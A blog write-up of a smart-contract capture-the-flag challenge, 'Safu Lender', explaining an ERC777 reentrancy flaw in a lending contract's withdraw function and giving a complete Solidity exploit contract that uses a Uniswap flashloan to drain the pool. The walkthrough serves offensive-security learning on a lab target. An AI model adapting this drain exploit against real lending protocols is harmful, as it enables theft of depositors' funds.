---
title: "Mr Steal Yo Crypto — Safu Lender"
date: 2023-07-22
draft: false
description: "CTF - 20"
tags: ["CTF"]
series: ["CTF"]
series_order: 20
topics: ["CTF"]
showAuthor: false
showAuthorsBadges : false
---

This is the #20 challenge of [Mr Steal Yo Crypto](https://mrstealyocrypto.xyz/index.html). I will try to explain how to find the vulnerability.

> A set of challenges to learn offensive security of smart contracts. Featuring interesting challenges loosely (or directly) inspired by real world exploits.

Created by [@0xToshii](https://twitter.com/0xToshii).

I used the foundry version for this CTF: [mr-steal-yo-crypto-ctf-foundry](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement).

![Mr Steal Yo Crypto](https://cdn-images-1.medium.com/max/800/1*67w9ffBxLP4AMvoxHowZ2w.jpeg)

### Safu Lender

[SETTING]: Following the exploit of Safu Labs’ vault, wallet & AMM products — at Safu Labs HQ.

[Mr Big Balls Boss]: "Fuck Chad we gotta make sure our new lending product doesn’t get exploited. I got into crypto to rake in cash, not to write post-mortems and get flamed on Twitter."

[Mega Chad Dev]: "Don’t worry bossman we got a [redacted] audit this time, they even hooked us up with a 50% off voucher."

[FIN]: "You drain all the funds (99%+ wBTC), starting with no tokens."

- [See the contracts](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement/src/safu-lender)
- [Complete the challenge](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/20-safu-lender.sol)

## Review of the contract

### Test file

At [L108](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/20-safu-lender.sol#L108), we can see that the token wBTC is added as a collateral to the protocol. But the token is an ERC777, do I need to say why the vulnerability is certainly here? Of course, this is a challenge so it needs to have a vulnerability. The second argument will be in MoneyMarket.sol.

### MoneyMarketHelpers.sol

Just a big contract for handling errors. This is just noise for disturbing us.

### IMoneyMarket.sol

A simple interface.

### MoneyMarket.sol

Quick reminder, an ERC777 gives the hand to the caller before and after a transfer. In our case, we want to check if the protocol updates our balance of collateral amount after withdrawing token. With an ERC777, we can do a reentrancy and withdraw more token than we supposed. For withdrawing, we are calling `withdraw()`. The function is very long but this is only noise, we just want to verify if the update of the balance is after the transfer. Transfer of the wBTC occurs at [L685](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/src/safu-lender/MoneyMarket.sol#L685) with `doTransferOut()` and the updates of variables start only at [L691](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/src/safu-lender/MoneyMarket.sol#L691), which means the vulnerability is confirmed.

## Exploit the vulnerability

The vulnerability is a reentrancy of the system, which is possible by the wBTC (ERC777) token. Here is the exploit step by step:

1. Use a flashloan for getting some wBTC via UniswapV2.
2. Supply `n` amount of wBTC and directly withdraw `n` from the protocol.
3. Inside our contract, we will write a function `tokensReceived()`. This function will be called each time we receive wBTC tokens. When `tokensReceived()` is called, we directly call `withdraw()`.
4. When we reenter into `withdraw`, our balance of collateral is still equal to `n`. We can again withdraw `n` amount of wBTC.
5. Do that until the protocol is fully drained.
6. Send `n + fee` amount of wBTC to the Uniswap pool.
7. Check how much you win!

Here is a solution:

```solidity
contract Exploit {
    address owner;
    IUniswapV2Pair usdcBtcPair;
    IWETH weth;
    Token usdc;
    Token777 wbtc;
    IMoneyMarket moneyMarket;

    constructor(address _wbtc, address _moneyMarket, address _usdcBtcPair) {
        owner = msg.sender;
        wbtc = Token777(_wbtc);
        moneyMarket = IMoneyMarket(_moneyMarket);
        usdcBtcPair = IUniswapV2Pair(_usdcBtcPair);
        wbtc.approve(address(moneyMarket), type(uint).max);
        wbtc.approve(address(usdcBtcPair), type(uint).max);
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
    }

    function uniswapV2Call(address _address, uint amount0Out, uint amount1Out, bytes memory data) external {
        uint256 wbtcAmount = wbtc.balanceOf(address(this));
        console.log("balance wbtc of exploit: ", wbtcAmount);

        moneyMarket.supply(address(wbtc), amount1Out);

        moneyMarket.withdraw(address(wbtc), amount1Out);

        console.log("balance wbtc of exploit: ", wbtc.balanceOf(address(this)));
        console.log("amount to repay: ", (amount1Out * 103 / 100) + 1); // Yeah, the premium is a bit too high

        wbtc.transfer(address(usdcBtcPair), (amount1Out * 103 / 100) + 1);
        wbtc.transfer(owner, wbtc.balanceOf(address(this)));

        console.log("balance wbtc of attacker: ", wbtc.balanceOf(owner));
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (wbtc.balanceOf(address(moneyMarket)) >= 1e18) {
            console.log("balance wbtc of attacker: ", wbtc.balanceOf(owner));
            moneyMarket.withdraw(address(wbtc), amount);
        }
    }

    function pwn() external {
        usdcBtcPair.swap(0, 10e18, address(this), new bytes(1));
    }
}
```

You can check my test file [here](https://github.com/gp-ngmi/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/20-safu-lender.sol).

### Acknowledgement

Thank you [https://stermi

.xyz/](https://stermi.xyz/) for inspiring me to write articles on CTF ^^.